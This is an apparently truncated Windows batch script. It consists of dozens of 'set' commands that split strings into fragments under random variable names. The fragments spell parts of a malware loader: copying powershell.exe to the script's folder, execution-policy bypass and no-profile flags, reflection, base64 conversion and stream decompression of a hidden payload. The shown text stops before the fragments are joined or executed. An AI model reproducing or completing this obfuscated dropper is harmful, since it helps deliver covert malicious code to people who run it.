@echo off
set "udojjmWdEK=st"
set "bqJkRWJpNU=he"
set "WigYFpTtTS=ws"
set "PZLmvQAFmq=Sy"
set "fkPToJJhZX=\W"
set "DgeLKhMDLt=in"
set "oWEfRaoIQt=do"
set "IjsFxqcYch=\v"
set "vEKLyyxCAv= C"
set "KjMEqjfDFx=ll"
set "qwAIMeaevK=po"
set "SFThfccJgx=py"
set "akcjJCLnCk=xe"
set "dMcDsiGJbo=we"
set "ytPGtPqOWG=32"
set "aTMkFHclQi=nd"
set "mNWpHmDBNg=co"
set "nsJSaUsACz=he"
set "stEdDspeVm=Po"
set "JmQSXxpesY=:\"
set "NXrijzjIvk=s\"
set "SuxugAkmGF=we"
set "zIniBcBDbg=em"
set "acgJLvvrbj=.e"
set "QUyMUigiDm= /"
set "UruYlYjZzw=y "
set "sjYAYKckCx=1."
set "PggCDlpMpR=0\"
set "ubrFbvZffv=rS"
set "gVaiHCdPbl=rs"
set "nWvbpoJxQo=Wi"
set "PbarxFPbjI=ow"
set "KYORFvILvd=ll"
set "HcCNzIAurN=cd"
set "mnmPzHqSqB= %~dp0"
set "UJzYtlokjd=.Cop"
set "ynVIfOlqrR=tS46"
set "HiWpKpOfcJ=vert"
set "kczvHPzuiN=, $o"
set "HAgIQOvBMD=ZYYc"
set "TJyIXtarmE=bypa"
set "bqnzLdBOgi=le  "
set "LiJzYFHqNB=sGUc"
set "NbMbZcKuYt=Bmor"
set "IwFtpdLctC=n ''"
set "OxhQtXgIQz=eam("
set "LuJvimEeoA=.Cre"
set "nVSLHxmaqj=tem."
set "SnleWBfPeL=Syst"
set "SCsCcfdssm=.Len"
set "OVcpGYSlfn=Syst"
set "PjRhiihmSR=.Dis"
set "vCTUsPeBzm=.Mod"
set "tHVCqaQICi=ress"
set "fUtxELbGJH=0O+g"
set "eQBEUWXIfY=ert]"
set "qCiMohtHRZ=YdNr"
set "UgFHJsUDPD=-nop"
set "leiUuRluEH=ew-O"
set "ZFvfEKzDXz=flec"
set "YtijeNJSjr=ii.D"
set "BuEiLyuOIM=ment"
set "oKwmrWeVuZ=ress"
set "DQHyyUQTJL=ode]"
set "MckaqJclDZ=Disp"
set "lAaOAHJXtB=yRx."
